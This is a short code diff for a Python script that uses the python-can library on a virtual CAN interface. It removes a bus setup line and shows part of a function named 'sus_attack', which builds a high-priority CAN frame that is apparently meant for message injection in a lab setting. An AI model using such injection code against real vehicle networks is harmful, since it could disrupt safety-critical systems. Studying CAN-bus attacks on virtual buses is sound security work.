@@ -4,8 +4,6 @@ import time
 CAN_INTERFACE = "vcan0"  
 ID = 0x100 #higher priority ID
 
-bus = can.interface.Bus(channel="vcan0", bustype="socketcan")
-
 def sus_attack(bus):
     data = [0x7f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ]
     msg = can.Message(arbitration_id = ID, data = data, is_extended_id = False)
